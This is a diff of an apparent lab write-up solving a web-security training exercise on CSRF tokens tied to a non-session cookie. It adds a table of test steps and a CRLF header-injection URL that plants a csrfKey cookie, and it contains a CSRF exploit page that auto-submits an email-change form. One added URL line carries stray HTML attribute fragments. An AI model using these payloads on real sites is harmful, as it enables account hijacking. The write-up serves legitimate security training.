@@ -47,11 +47,20 @@ csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
 ```
 
 1. Check if the `csrfKey` is tied to `csrf`
-   - Log in as `wiener:peter` and acquire the user's `csrfKey` and `csrf` values
-   - Capture the request trying to change the user's email. Modify the csrf token so it becomes invalid -> If the application accepts the request, we can conclude the csrfKey and csrf are not tied together. Otherwise, continue to the next step.
-   - Log in as `carlos:montoya` and capture the user's csrf. Replace wiener's csrf token with carlos' -> If the application accepst the request, we can conclud the csrfKey and csrf are not tied together. Otherwise, continue to the next step.
-   - Log in as `wiener:peter` and replace wiener's csrfKey and csrf tokens with carlos'-> If the application accepts the request, we can conclue the csrf and csrfKey are tied together but the pair doesn't tie to the user-session cookie
-3. Log in the victim and set the victim's csrfKey value to the attackers
+
+| Steps | Results |
+| ----- | ------- |
+| Log in as `wiener:peter` and acquire the user's `csrfKey` and `csrf` values | |
+| Capture the request trying to change the user's email. Modify the csrf token so it becomes invalid | If the application accepts the request, we can conclude the csrfKey and csrf are not tied together. Otherwise, continue to the next step. |
+| Log in as `carlos:montoya` and capture the user's csrf. Replace wiener's csrf token with carlos' | If the application accepst the request, we can conclud the csrfKey and csrf are not tied together. Otherwise, continue to the next step. |
+| Log in as `wiener:peter` and replace wiener's csrfKey and csrf tokens with carlos' | If the application accepts the request, we can conclue the csrf and csrfKey are tied together but the pair doesn't tie to the user-session cookie
+
+2. Look for a functionality that allows us to modify the csrfKey. In this case, we can inject in the search function through GET request
+
+```bash
+https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()
+```
+In the response, we should see the `csrfKey` is set as we wish.
 4. Deliver the payload
 
 ```bash
@@ -60,10 +69,10 @@ csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
   <body>
     <form action="https://0ac5009504bab9d186967b5f002b0096.web-security-academy.net/my-account/change-email" method="POST">
       <input type="hidden" name="email" value="hello&#64;world&#46;com" />
-      <input type="hidden" name="csrf" value="7UvMSxuvnPngKzO9D1OqyuylaKBAJkpK" />
+      <input type="hidden" name="csrf" value="Your-csrf" />
       <input type="submit" value="Submit request" />
     </form>
-      <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+      <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-csrfKey%3b%20SameSite=None" onerror="document.forms[0].submit()">
   </body>
 </html>
 ```
